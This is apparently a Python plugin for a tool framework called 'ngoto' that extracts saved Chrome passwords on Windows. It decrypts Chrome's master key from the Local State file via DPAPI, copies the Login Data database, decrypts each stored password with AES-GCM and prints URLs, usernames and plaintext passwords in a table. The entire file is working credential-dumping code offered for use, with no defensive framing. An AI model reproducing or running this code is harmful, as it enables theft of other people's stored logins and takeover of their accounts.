from ngoto.core.util.interface import output
from ngoto.core.util.rich.table import Table
from ngoto.core.util.rich.style import Style
from ngoto.core.decorators import plugin
from dataclasses import dataclass

title_style = Style(color="blue", blink=False, bold=True)
border_style = Style(color="black", blink=False, bold=True)
header_style = Style(color="black", blink=False, bold=True)


def decrypt_password(logger, password, key):
    from Crypto.Cipher import AES
    import win32crypt
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            logger.warning(
                f'Could not decrypt password, {e}',
                program='Chrome Passwords')
            return str(win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1])
        except Exception as e2:
            logger.warning(
                f'Could not decrypt password, {e2}',
                program='Chrome Passwords')
            return ""


def get_encryption_key():
    import os
    import json
    import base64
    import win32crypt
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def get_info(logger) -> list:
    import shutil
    import os
    import sqlite3
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local",
        "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        ' '.join(
            ["select origin_url, action_url, username_value,",
                "password_value, date_created, date_last_used",
                "from logins order by date_created"]))

    @dataclass
    class Password:
        origin_url: str
        action_url: str
        username_value: str
        password_value: str
        date_created: str
        date_last_used: str

    passwords = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(logger, row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        passwords.append(
            Password(
                str(origin_url),
                str(action_url),
                str(username),
                str(password),
                str(date_created),
                str(date_last_used)
                )
            )
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except Exception as e:
        logger.warning(
            f'Could not remove {filename}, {e}',
            program='Chrome Passwords')
    return {"passwords": passwords}


def print_info(context):
    table = Table(
        title="Ngoto Chrome Passwords Plugin",
        title_style=title_style,
        border_style=border_style)
    table.add_column("Origin URL", style=header_style)
    table.add_column("Action URL", style=header_style)
    table.add_column("Username", style=header_style)
    table.add_column("Password", style=header_style)
    table.add_column("Creation Date", style=header_style)
    table.add_column("Last Used", style=header_style)
    for password in context["passwords"]:
        table.add_row(
            password.origin_url,
            password.action_url,
            password.username_value,
            password.password_value,
            password.date_created,
            password.date_last_used)
    output(table)


class ChromePasswords():
    """ Get IP for URL """
    @classmethod
    @plugin(name='Chrome Passwords', desc='Get saved chrome passwords',
            folder='Passwords')
    def url(self, logger):
        logger.info('Getting Chrome Passwords', program='Chrome Passwords')
        info = get_info(logger)
        logger.info('Successfully Got Passwords', program='Chrome Passwords')
        print_info(info)
        return True


def setup():
    return ChromePasswords()
